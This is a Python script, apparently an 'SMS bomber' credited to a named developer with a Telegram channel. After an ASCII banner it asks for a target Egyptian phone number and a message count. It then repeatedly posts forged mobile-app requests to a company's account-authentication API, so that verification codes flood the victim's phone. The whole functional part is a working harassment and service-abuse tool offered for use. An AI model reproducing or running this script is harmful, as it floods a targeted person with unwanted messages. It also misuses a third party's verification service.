import requests
import pyfiglet
import hashlib, random
import requests,os,sys,time,pyfiglet
from time import sleep


red_color = '\033[1;31m'
yellow_color = '\033[1;33m'
green_color = '\033[2;32m'
white_color = '\033[1;97m'
blue_color = '\033[1;34m'
light_blue_color = '\033[2;36m'
light_green_color = '\033[1;32m'
light_yellow_color = '\033[1;33m'

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
print(F+"---------  Welcome My Script {Spam Whats App } --------")
time.sleep(1.5)
print()
print(B+"="*60)
time.sleep(1.5)
print("""
\033[1;93m _____ ____  _   _             """)
time.sleep(1.5)             
print("""\033[1;95m| ____| __ )| \ | |            """)  
time.sleep(1.5)               
print("""\033[1;92m|  _| |  _ \|  \| |              """)  
time.sleep(1.5)            
print("""\033[1;97m| |___| |_) | |\  |                              """)    
time.sleep(1.5) 
print("""\033[1;91m|_____|____/|_| \_|  _  __    _    ____ _____ ____   """)
time.sleep(1.5)
print("""\033[1;93m| ____| |      / \  | |/ /   / \  | __ )| ____|  _ \  """)
time.sleep(1.5)
print("""\033[1;92m|  _| | |     / _ \ | ' /   / _ \ |  _ \|  _| | |_) |""") 
time.sleep(1.5)
print("""\033[1;95m| |___| |___ / ___ \| . \  / ___ \| |_) | |___|  _ <  """) 
time.sleep(1.5)
print("""\033[1;97m|_____|_____/_/   \_\_|\_\/_/   \_\____/|_____|_| \_\
""")
time.sleep(1.5)

print("""
""")
time.sleep(1.5)
print(B+"---------------------------by Mohamed Safwat--------------------")
time.sleep(1.5)
print(E+"""
Dev => Mohamed Safwat
My User =>@QWNWJ
My Chaneel => https://t.me/XXoXXo0
""")
time.sleep(1.5)
print(C+                     "أّنِأّ لَمَ أّخَلَقِ لَأګوِنِ مَثّلَ-ِمَ بِلَ لَأګوِنِ حٌلَمَ-ِمَ 𝆹𝅥𝅮")
time.sleep(1.5)
print("")
time.sleep(1.5)
print(B+"="*60)
time.sleep(1.5)
print()
number =input(Y+"Enter Your Number : \033[1;33m")
print()
time.sleep(1.5)
number2 =''
#nu3 = input(green_color + "Enter a number 2 : " + light_blue_color)
#print("")

m =int(input(Y+"Enter Number Of Message : \033[1;33m"))
print()
time.sleep(1.5)
for _ in range(m):
    url3 = 'https://api.inyad.com/accounts/konnash/mobile/create-authentication'

    headers3 = {
        'authentication': 'h2',
        'Host': 'api.inyad.com',
        'konnash-api-version': '1021201',
        'content-type': 'application/json; charset=UTF-8',
        'content-length': '150',
        'accept-encoding': 'gzip',
        'user-agent': 'okhttp/4.8.0'
    }

    data3 = '{"header":{"language":"ar","request_id":"4f18e521-c47d-4cd9-86af-8ea4eaa41ce9","timestamp":1704361926043},"payload":{"phone_number":"+20%s"}}' % (number)

    r3 = requests.post(url3, headers=headers3, data=data3).text
    url33 = 'https://api.inyad.com/accounts/konnash/mobile/create-authentication'

    headers33 = {
        'authentication': 'h2',
        'Host': 'api.inyad.com',
        'konnash-api-version': '1021201',
        'content-type': 'application/json; charset=UTF-8',
        'content-length': '150',
        'accept-encoding': 'gzip',
        'user-agent': 'okhttp/4.8.0'
    }

    data33 = '{"header":{"language":"ar","request_id":"4f18e521-c47d-4cd9-86af-8ea4eaa41ce9","timestamp":1704361926043},"payload":{"phone_number":"+20%s"}}' % (number2)

    r33 = requests.post(url33, headers=headers33, data=data33).text
    print(Z+"Dane send Successfully  ✅ ")
    print()
    time.sleep(1.5)
